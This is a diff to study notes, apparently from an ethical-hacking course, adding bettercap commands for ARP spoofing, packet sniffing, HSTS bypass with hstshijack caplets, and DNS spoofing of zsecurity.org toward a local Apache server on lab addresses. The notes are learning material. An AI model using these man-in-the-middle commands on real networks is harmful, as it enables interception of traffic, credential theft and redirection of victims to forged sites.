@@ -137,9 +137,32 @@ bettercap -iface eth0 #initialize
 net.probe on #net probing, gives list of connected IPs
 
 net.show #list of connected clients
+#'help' can be used to view modules
 
 set arp.spoof.fullduplex true
 set arp.spoof.targets 10.0.2.15 #change parameter values
 
 arp.spoof on #start arp spoofer
+
+net.sniff on #sniff packets
+
+#.cap files can be created to run custom scripts to save time
+bettercap -iface eth0 -caplet spoof.cap
+```
+
+* HTTPS and HSTS can be bypasses using caplets from Bettercap, such as hstshijack.
+
+* DNS Spoofing:
+
+```shell
+service apache2 start #start web server
+
+bettercap -iface eth0 -caplet spoof.cap
+
+set dns.spoof.all true
+
+set dns.spoof.domains zsecurity.org, *.zsecurity.org
+
+dns.spoof on
+#by default, it will redirect to interface address (10.0.2.4)
 ```
